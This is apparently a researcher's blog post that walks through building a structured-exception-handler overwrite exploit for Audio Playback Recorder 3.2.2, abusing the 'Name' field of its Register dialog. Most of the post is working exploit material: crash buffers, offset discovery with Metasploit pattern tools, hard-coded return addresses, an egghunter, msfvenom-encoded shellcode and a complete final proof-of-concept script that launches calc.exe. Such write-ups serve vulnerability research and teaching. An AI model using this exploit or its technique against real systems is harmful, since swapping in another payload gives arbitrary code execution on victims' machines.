---
layout: post
title: Audio Playback Recorder 3.2.2 - Structured Exception Handling Overwrite
date: 2020-03-08 18:00:00
categories: posts
comments: false
en: true
---

#### Audio Playback Recorder 3.2.2 suffers from a Structured Exception Handling Overwrite when a long string is parsed through the parameter “Name” within the "Register" section.

##### Initial PoC:

```terma
import struct

buffer = "A" * 500

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

##### Once the exploit is run, the payload is copied into the clipboard.

##### In order to exploit the application, press "Go".

![](/assets/img/Findings11/1.png)

##### Press on the button "Register".

![](/assets/img/Findings11/2.png)

##### Paste the contents of the payload on the parameter "Name".

![](/assets/img/Findings11/3.png)

###### Response of the SEH Chain.

![](/assets/img/Findings11/4.png)

###### Creating a parameter with msf-pattern_create.

```term
root@whitecr0wz:~# msf-pattern_create -l 500 
...
```

##### This pattern is pasted into the parameter "Name".

![](/assets/img/Findings11/5.png)

##### Response of the SEH Chain II.

![](/assets/img/Findings11/6.png)

##### Obtaining the offset with the use of msf-pattern_offset.

```term
root@whitecr0wz:~# msf-pattern_offset -q 41327041 
[*] Exact match at offset 456
root@whitecr0wz:~# 
```

###### Current PoC:

```term
import struct

buffer = "A" * 456 + "BBBB" + "CCCC"

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

##### Response of the SEH Chain III.

![](/assets/img/Findings11/7.png)

##### Enumerating the modules.

![](/assets/img/Findings11/8.png)

##### Listing the POP-POP-RETN sequences.

![](/assets/img/Findings11/9.png)

##### Current PoC:

```term
mport struct

nseh = struct.pack("<I", 0x06710870)
seh = struct.pack("<I", 0x10023B71)

buffer = "A" * 456 + nseh + seh + "C" * 200

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

##### Response of the SEH Chain IV.

![](/assets/img/Findings11/10.png)

##### The flow is hijacked.

![](/assets/img/Findings11/11.png)

##### Due to the fact that we have incredibly small buffer space (400 bytes), and as we require an alphanumeric shellcode, which will double the size of it, an egghunter will be required. For more information, see [here](https://whitecr0wz.github.io/posts/Exploiting-SEH-Overwrites-on-Windows-with-the-use-of-Egghunters/).

![](/assets/img/Findings11/12.png)

##### Current PoC:

```term
import struct

buf = "w00tw00t"
buf += "\xff" * 500

egg = ""
egg += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egg += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

nseh = struct.pack("<I", 0x06710870)
seh = struct.pack("<I", 0x10023B71)

buffer = "A" * 456 + nseh + seh + "A" * 5 + egg + "C" * 200

f = open ("poc.txt", "w")
f.write(buffer)
f.close()

f = open ("buf.txt", "w")
f.write(buf)
f.close()
```

##### Introducing the payload within a place in which may not crash the program, so it is searched on later through the egghunter.

![](/assets/img/Findings11/13.png)

![](/assets/img/Findings11/14.png)

![](/assets/img/Findings11/15.png)

##### It is possible to see that the flag has been injected as expected.

![](/assets/img/Findings11/16.png)

##### After pressing SHIFT+RUN (F9),the egghunter is activated and the \xff bytes are executed.

![](/assets/img/Findings11/17.png)

##### Generating alphanumeric shellcode.

```term
root@whitecr0wz:~# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed EXITFUNC=thread 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 448 (iteration=0)
x86/alpha_mixed chosen with final size 448
Payload size: 448 bytes
Final size of py file: 2188 bytes
buf =  b""
buf += b"\x89\xe7\xda\xcf\xd9\x77\xf4\x5b\x53\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x78\x68\x6d"
buf += b"\x52\x77\x70\x75\x50\x73\x30\x45\x30\x6b\x39\x69\x75"
buf += b"\x45\x61\x69\x50\x31\x74\x6c\x4b\x76\x30\x34\x70\x4e"
buf += b"\x6b\x51\x42\x66\x6c\x4c\x4b\x33\x62\x72\x34\x4c\x4b"
buf += b"\x33\x42\x51\x38\x36\x6f\x6e\x57\x71\x5a\x66\x46\x66"
buf += b"\x51\x49\x6f\x4c\x6c\x37\x4c\x75\x31\x43\x4c\x43\x32"
buf += b"\x66\x4c\x71\x30\x6a\x61\x6a\x6f\x76\x6d\x47\x71\x78"
buf += b"\x47\x49\x72\x58\x72\x43\x62\x51\x47\x6c\x4b\x46\x32"
buf += b"\x32\x30\x6c\x4b\x32\x6a\x37\x4c\x4e\x6b\x70\x4c\x47"
buf += b"\x61\x31\x68\x7a\x43\x53\x78\x35\x51\x6e\x31\x42\x71"
buf += b"\x6e\x6b\x73\x69\x67\x50\x65\x51\x68\x53\x6e\x6b\x71"
buf += b"\x59\x35\x48\x59\x73\x35\x6a\x37\x39\x6c\x4b\x37\x44"
buf += b"\x4c\x4b\x53\x31\x4a\x76\x45\x61\x49\x6f\x4c\x6c\x5a"
buf += b"\x61\x58\x4f\x46\x6d\x47\x71\x4b\x77\x77\x48\x59\x70"
buf += b"\x72\x55\x7a\x56\x56\x63\x53\x4d\x79\x68\x77\x4b\x51"
buf += b"\x6d\x37\x54\x70\x75\x4a\x44\x46\x38\x4e\x6b\x30\x58"
buf += b"\x51\x34\x77\x71\x6e\x33\x53\x56\x6c\x4b\x74\x4c\x32"
buf += b"\x6b\x4c\x4b\x31\x48\x67\x6c\x67\x71\x79\x43\x6c\x4b"
buf += b"\x67\x74\x6c\x4b\x73\x31\x6a\x70\x6b\x39\x30\x44\x76"
buf += b"\x44\x74\x64\x33\x6b\x33\x6b\x51\x71\x56\x39\x33\x6a"
buf += b"\x66\x31\x69\x6f\x6d\x30\x43\x6f\x63\x6f\x31\x4a\x6e"
buf += b"\x6b\x42\x32\x5a\x4b\x4e\x6d\x63\x6d\x63\x5a\x76\x61"
buf += b"\x6e\x6d\x4e\x65\x4c\x72\x53\x30\x53\x30\x75\x50\x52"
buf += b"\x70\x55\x38\x35\x61\x4c\x4b\x72\x4f\x4f\x77\x79\x6f"
buf += b"\x69\x45\x4d\x6b\x4d\x30\x47\x6d\x76\x4a\x46\x6a\x53"
buf += b"\x58\x4d\x76\x4c\x55\x4d\x6d\x4f\x6d\x49\x6f\x69\x45"
buf += b"\x57\x4c\x66\x66\x61\x6c\x46\x6a\x6b\x30\x39\x6b\x39"
buf += b"\x70\x62\x55\x44\x45\x6f\x4b\x57\x37\x45\x43\x71\x62"
buf += b"\x50\x6f\x61\x7a\x47\x70\x33\x63\x79\x6f\x59\x45\x61"
buf += b"\x73\x70\x61\x52\x4c\x72\x43\x36\x4e\x32\x45\x61\x68"
buf += b"\x71\x75\x43\x30\x41\x41"
root@whitecr0wz:~# 
```

##### Final PoC:

```term
import struct

# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed EXITFUNC=thread 
# Payload size: 448 bytes

buf =  b"w00tw00t"
buf += b"\x89\xe7\xda\xcf\xd9\x77\xf4\x5b\x53\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x78\x68\x6d"
buf += b"\x52\x77\x70\x75\x50\x73\x30\x45\x30\x6b\x39\x69\x75"
buf += b"\x45\x61\x69\x50\x31\x74\x6c\x4b\x76\x30\x34\x70\x4e"
buf += b"\x6b\x51\x42\x66\x6c\x4c\x4b\x33\x62\x72\x34\x4c\x4b"
buf += b"\x33\x42\x51\x38\x36\x6f\x6e\x57\x71\x5a\x66\x46\x66"
buf += b"\x51\x49\x6f\x4c\x6c\x37\x4c\x75\x31\x43\x4c\x43\x32"
buf += b"\x66\x4c\x71\x30\x6a\x61\x6a\x6f\x76\x6d\x47\x71\x78"
buf += b"\x47\x49\x72\x58\x72\x43\x62\x51\x47\x6c\x4b\x46\x32"
buf += b"\x32\x30\x6c\x4b\x32\x6a\x37\x4c\x4e\x6b\x70\x4c\x47"
buf += b"\x61\x31\x68\x7a\x43\x53\x78\x35\x51\x6e\x31\x42\x71"
buf += b"\x6e\x6b\x73\x69\x67\x50\x65\x51\x68\x53\x6e\x6b\x71"
buf += b"\x59\x35\x48\x59\x73\x35\x6a\x37\x39\x6c\x4b\x37\x44"
buf += b"\x4c\x4b\x53\x31\x4a\x76\x45\x61\x49\x6f\x4c\x6c\x5a"
buf += b"\x61\x58\x4f\x46\x6d\x47\x71\x4b\x77\x77\x48\x59\x70"
buf += b"\x72\x55\x7a\x56\x56\x63\x53\x4d\x79\x68\x77\x4b\x51"
buf += b"\x6d\x37\x54\x70\x75\x4a\x44\x46\x38\x4e\x6b\x30\x58"
buf += b"\x51\x34\x77\x71\x6e\x33\x53\x56\x6c\x4b\x74\x4c\x32"
buf += b"\x6b\x4c\x4b\x31\x48\x67\x6c\x67\x71\x79\x43\x6c\x4b"
buf += b"\x67\x74\x6c\x4b\x73\x31\x6a\x70\x6b\x39\x30\x44\x76"
buf += b"\x44\x74\x64\x33\x6b\x33\x6b\x51\x71\x56\x39\x33\x6a"
buf += b"\x66\x31\x69\x6f\x6d\x30\x43\x6f\x63\x6f\x31\x4a\x6e"
buf += b"\x6b\x42\x32\x5a\x4b\x4e\x6d\x63\x6d\x63\x5a\x76\x61"
buf += b"\x6e\x6d\x4e\x65\x4c\x72\x53\x30\x53\x30\x75\x50\x52"
buf += b"\x70\x55\x38\x35\x61\x4c\x4b\x72\x4f\x4f\x77\x79\x6f"
buf += b"\x69\x45\x4d\x6b\x4d\x30\x47\x6d\x76\x4a\x46\x6a\x53"
buf += b"\x58\x4d\x76\x4c\x55\x4d\x6d\x4f\x6d\x49\x6f\x69\x45"
buf += b"\x57\x4c\x66\x66\x61\x6c\x46\x6a\x6b\x30\x39\x6b\x39"
buf += b"\x70\x62\x55\x44\x45\x6f\x4b\x57\x37\x45\x43\x71\x62"
buf += b"\x50\x6f\x61\x7a\x47\x70\x33\x63\x79\x6f\x59\x45\x61"
buf += b"\x73\x70\x61\x52\x4c\x72\x43\x36\x4e\x32\x45\x61\x68"
buf += b"\x71\x75\x43\x30\x41\x41"

egg = ""
egg += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egg += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

nseh = struct.pack("<I", 0x06710870)
seh = struct.pack("<I", 0x10023B71)

buffer = "A" * 456 + nseh + seh + "A" * 5 + egg + "C" * 200

f = open ("poc.txt", "w")
f.write(buffer)
f.close()

f = open ("buf.txt", "w")
f.write(buf)
f.close()
```

### EndGame.

![](/assets/img/Findings11/11-proof.gif)
